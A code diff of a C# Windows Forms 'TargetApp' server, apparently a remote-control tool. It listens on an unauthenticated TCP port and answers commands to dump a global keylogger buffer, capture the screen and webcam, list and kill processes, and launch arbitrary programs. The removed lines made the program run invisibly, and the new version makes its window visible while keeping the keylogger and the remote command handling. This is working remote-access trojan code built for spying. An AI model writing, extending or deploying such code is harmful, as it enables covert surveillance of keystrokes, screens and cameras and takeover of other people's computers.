@@ -11,165 +11,314 @@ using System.Threading;
 using System.Windows.Forms;
 using AForge.Video;
 using AForge.Video.DirectShow;
+using System.Collections.Generic;
 
 namespace TargetApp
 {
     public partial class Form1 : Form
     {
-        TcpListener listener;
-        const int PORT = 8888;
+        TcpListener listener = null!;
+        const int PORT = 9999;
 
-        // Webcam
-        FilterInfoCollection videoDevices;
-        VideoCaptureDevice videoSource;
-        string lastWebcamFrame = "";
-
-        // Keylogger
-        System.Windows.Forms.Timer keylogTimer = new System.Windows.Forms.Timer();
-        StringBuilder keyLogBuffer = new StringBuilder();
+        
         [DllImport("User32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
+        System.Windows.Forms.Timer keylogTimer = new System.Windows.Forms.Timer();
+        StringBuilder keyLogBuffer = new StringBuilder();
+
+       
+        FilterInfoCollection videoDevices = null!;
+        VideoCaptureDevice videoSource = null!;
+        string lastWebcamFrame = "";
+
+      
+        PictureBox pbCamLocal = new PictureBox();
+        long lastFrameTime = 0;
 
         public Form1()
         {
             InitializeComponent();
             CheckForIllegalCrossThreadCalls = false;
-            // Cấu hình chạy ẩn
-            this.ShowInTaskbar = false;
-            this.WindowState = FormWindowState.Minimized;
-            this.Opacity = 0; // Làm mờ hoàn toàn
+            this.Load += Form1_Load;
+            this.FormClosing += Form1_FormClosing;
+
+            this.Text = "SERVER 9999 - SMART KILL APP";
+            this.BackColor = Color.Cyan;
+            this.WindowState = FormWindowState.Normal;
         }
 
-        private void Form1_Load(object sender, EventArgs e)
+        private void Form1_Load(object? sender, EventArgs e)
         {
-            // Chạy Socket Server ở luồng riêng
-            Thread serverThread = new Thread(StartServer);
-            serverThread.IsBackground = true;
-            serverThread.Start();
+       
+            pbCamLocal.Name = "pbCamLocal";
+            pbCamLocal.Size = new Size(640, 480);
+            pbCamLocal.Location = new Point(10, 10);
+            pbCamLocal.SizeMode = PictureBoxSizeMode.StretchImage;
+            pbCamLocal.BackColor = Color.Black;
+            pbCamLocal.Visible = true;
+            this.Controls.Add(pbCamLocal);
+            pbCamLocal.BringToFront();
 
-            // Chạy Keylogger
+            Thread t = new Thread(StartServer);
+            t.IsBackground = true;
+            t.Start();
+
             keylogTimer.Interval = 10;
             keylogTimer.Tick += KeylogTimer_Tick;
             keylogTimer.Start();
         }
 
-        // --- XỬ LÝ SOCKET ---
+        
         void StartServer()
         {
             try
             {
                 listener = new TcpListener(IPAddress.Any, PORT);
                 listener.Start();
+
                 while (true)
                 {
-                    TcpClient client = listener.AcceptTcpClient();
-                    Thread t = new Thread(HandleClient);
-                    t.Start(client);
+                    try
+                    {
+                        TcpClient client = listener.AcceptTcpClient();
+                        Thread t = new Thread(HandleClient);
+                        t.Start(client);
+                    }
+                    catch { }
                 }
             }
-            catch { }
+            catch (Exception ex) { MessageBox.Show("Lỗi Server: " + ex.Message); }
         }
 
-        void HandleClient(object obj)
+        void HandleClient(object? obj)
         {
+            if (obj == null) return;
             TcpClient client = (TcpClient)obj;
             NetworkStream stream = client.GetStream();
-            byte[] buffer = new byte[1024 * 5000]; // 5MB Buffer
+            byte[] buffer = new byte[1024 * 5000];
 
             try
             {
                 int bytesRead = stream.Read(buffer, 0, buffer.Length);
                 if (bytesRead > 0)
                 {
-                    string req = Encoding.UTF8.GetString(buffer, 0, bytesRead);
-                    string res = ProcessCommand(req);
-                    byte[] resBytes = Encoding.UTF8.GetBytes(res);
+                    string request = Encoding.UTF8.GetString(buffer, 0, bytesRead);
+                    string response = ProcessCommand(request);
+                    byte[] resBytes = Encoding.UTF8.GetBytes(response);
                     stream.Write(resBytes, 0, resBytes.Length);
                 }
             }
             catch { }
-            client.Close();
+            finally
+            {
+                try { client.Close(); } catch { }
+            }
         }
 
-        // --- XỬ LÝ LỆNH ---
         string ProcessCommand(string cmd)
         {
-            string[] p = cmd.Split('|');
-            string action = p[0];
-            string param = p.Length > 1 ? p[1] : "";
+            string[] parts = cmd.Split('|');
+            string action = parts[0];
+            string param = parts.Length > 1 ? parts[1] : "";
 
             switch (action)
             {
-                case "LIST": // 1. List Process
-                    string s = "";
-                    foreach (var pr in Process.GetProcesses()) s += pr.Id + ":" + pr.ProcessName + ";";
-                    return s;
-                case "START": // 2. Start App
-                    try { Process.Start(param); return "OK"; } catch { return "ERR"; }
-                case "STOP": // 2. Stop App
-                    try { Process.GetProcessById(int.Parse(param)).Kill(); return "OK"; } catch { return "ERR"; }
-                case "SCREENSHOT": // 3. Screenshot
-                    return GetScreen();
-                case "KEYLOG": // 4. Keylog
-                    string k = keyLogBuffer.ToString(); keyLogBuffer.Clear(); return k;
-                case "SHUTDOWN": // 5. Shutdown
-                    Process.Start("shutdown", "/s /t 0"); return "Bye";
-                case "WEBCAM_ON": // 6. Webcam On
-                    StartCam(); return "Cam On";
-                case "WEBCAM_GET": // 6. Get Frame
-                    return lastWebcamFrame;
-                default: return "Unknown";
+                case "WEBCAM_ON":
+                    StartWebcam();
+                    return "OK: Đã bật Camera";
+                case "WEBCAM_OFF":
+                    StopWebcam();
+                    return "OK: Đã tắt Camera";
+                case "WEBCAM_GET":
+                    return string.IsNullOrEmpty(lastWebcamFrame) ? "NO_IMAGE" : lastWebcamFrame;
+
+                case "LIST": return GetProcs();
+
+                case "START":
+                    try
+                    {
+                        Process.Start(param);
+                        return "OK: Đã mở '" + param + "'";
+                    }
+                    catch (Exception ex) { return "Lỗi mở App: " + ex.Message; }
+
+                case "STOP":
+                    try
+                    {
+                        
+                        if (int.TryParse(param, out int pid))
+                        {
+                            Process.GetProcessById(pid).Kill();
+                            return "OK: Đã diệt PID " + pid;
+                        }
+                        
+                        else
+                        {
+                            string searchName = param.ToLower().Replace(".exe", "").Trim();
+
+                        
+                            Process[] procs = Process.GetProcessesByName(searchName);
+
+                            
+                            if (procs.Length == 0)
+                            {
+                                Process[] allProcs = Process.GetProcesses();
+                                List<Process> foundList = new List<Process>();
+
+                                foreach (Process p in allProcs)
+                                {
+                                    
+                                    if (p.ProcessName.ToLower().Contains(searchName))
+                                    {
+                                        foundList.Add(p);
+                                    }
+                                }
+                                procs = foundList.ToArray();
+                            }
+
+                         
+                            if (procs.Length == 0) return "Lỗi: Không tìm thấy app nào có tên chứa '" + param + "'";
+
+                            int count = 0;
+                            foreach (Process p in procs)
+                            {
+                                try { p.Kill(); count++; } catch { }
+                            }
+                            return "OK: Đã diệt "  + param;
+                        }
+                    }
+                    catch (Exception ex) { return "Lỗi: " + ex.Message; }
+
+                case "KEYLOG": string k = keyLogBuffer.ToString(); keyLogBuffer.Clear(); return k;
+                case "SCREENSHOT": return GetScreen();
+
+                default: return "Lỗi: Lệnh không tồn tại";
             }
         }
 
-        // --- CHỨC NĂNG PHỤ ---
-        string GetScreen()
+        string GetProcs()
         {
-            Rectangle bounds = Screen.GetBounds(Point.Empty);
-            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+            try
             {
-                using (Graphics g = Graphics.FromImage(bitmap))
+                StringBuilder sb = new StringBuilder();
+                Process[] processes = Process.GetProcesses();
+                foreach (Process p in processes)
                 {
-                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                    sb.AppendLine("PID: " + p.Id + " - Name: " + p.ProcessName);
                 }
-                using (MemoryStream ms = new MemoryStream())
-                {
-                    bitmap.Save(ms, ImageFormat.Jpeg);
-                    return Convert.ToBase64String(ms.ToArray());
-                }
+                return sb.ToString();
             }
+            catch (Exception ex) { return "Lỗi: " + ex.Message; }
         }
-
-        void KeylogTimer_Tick(object sender, EventArgs e)
+        void StartWebcam()
         {
-            for (int i = 0; i < 255; i++)
+            try
             {
-                if (GetAsyncKeyState(i) == -32767) keyLogBuffer.Append(((Keys)i).ToString() + " ");
+                if (videoSource != null && videoSource.IsRunning) return;
+
+                videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+                if (videoDevices.Count == 0) return;
+
+                videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
+
+                
+                VideoCapabilities? bestConfig = null;
+                foreach (VideoCapabilities cap in videoSource.VideoCapabilities)
+                {
+                    if (bestConfig == null) bestConfig = cap;
+                    else
+                    {
+                        if (cap.AverageFrameRate > bestConfig.AverageFrameRate) bestConfig = cap;
+                        else if (cap.AverageFrameRate == bestConfig.AverageFrameRate)
+                        {
+                            if (cap.FrameSize.Width > bestConfig.FrameSize.Width && cap.FrameSize.Width <= 1280)
+                                bestConfig = cap;
+                        }
+                    }
+                }
+                if (bestConfig != null) videoSource.VideoResolution = bestConfig;
+
+                videoSource.NewFrame += VideoSource_NewFrame;
+                videoSource.Start();
+
+                this.Invoke((MethodInvoker)delegate { pbCamLocal.Visible = true; });
             }
+            catch (Exception ex) { MessageBox.Show("Lỗi bật cam: " + ex.Message); }
         }
 
-        void StartCam()
+        void StopWebcam()
         {
-            if (videoSource != null && videoSource.IsRunning) return;
-            videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
-            if (videoDevices.Count == 0) return;
-            videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
-            videoSource.NewFrame += (s, ev) => {
-                using (Bitmap bmp = (Bitmap)ev.Frame.Clone())
+            if (videoSource != null && videoSource.IsRunning)
+            {
+                videoSource.SignalToStop();
+                videoSource.WaitForStop();
+                videoSource = null!;
+            }
+            this.Invoke((MethodInvoker)delegate { pbCamLocal.Image = null; });
+        }
+
+        private void VideoSource_NewFrame(object sender, NewFrameEventArgs eventArgs)
+        {
+            try
+            {
+                long now = DateTime.Now.Ticks / TimeSpan.TicksPerMillisecond;
+                if (now - lastFrameTime < 15) return;
+                lastFrameTime = now;
+
+                Bitmap frame = (Bitmap)eventArgs.Frame.Clone();
+
+                using (Bitmap resized = new Bitmap(frame, new Size(640, 480)))
                 {
                     using (MemoryStream ms = new MemoryStream())
                     {
-                        bmp.Save(ms, ImageFormat.Jpeg);
+                        resized.Save(ms, ImageFormat.Jpeg);
                         lastWebcamFrame = Convert.ToBase64String(ms.ToArray());
                     }
                 }
-            };
-            videoSource.Start();
+
+                this.Invoke((MethodInvoker)delegate
+                {
+                    if (pbCamLocal.Image != null)
+                    {
+                        var old = pbCamLocal.Image;
+                        pbCamLocal.Image = null;
+                        old.Dispose();
+                    }
+                    pbCamLocal.Image = (Bitmap)frame.Clone();
+                });
+
+                frame.Dispose();
+            }
+            catch { }
         }
 
-        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        string GetScreen()
         {
-            if (videoSource != null && videoSource.IsRunning) videoSource.Stop();
+            try
+            {
+                Rectangle bounds = Screen.GetBounds(Point.Empty);
+                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+                {
+                    using (Graphics g = Graphics.FromImage(bitmap)) g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                    using (MemoryStream ms = new MemoryStream())
+                    {
+                        bitmap.Save(ms, ImageFormat.Jpeg);
+                        return Convert.ToBase64String(ms.ToArray());
+                    }
+                }
+            }
+            catch { return ""; }
+        }
+
+        private void KeylogTimer_Tick(object? sender, EventArgs e)
+        {
+            for (int i = 0; i < 255; i++) if (GetAsyncKeyState(i) == -32767) keyLogBuffer.Append(((Keys)i).ToString() + " ");
+        }
+
+        private void Form1_FormClosing(object? sender, FormClosingEventArgs e)
+        {
+            StopWebcam();
+            if (listener != null) listener.Stop();
         }
     }
 }
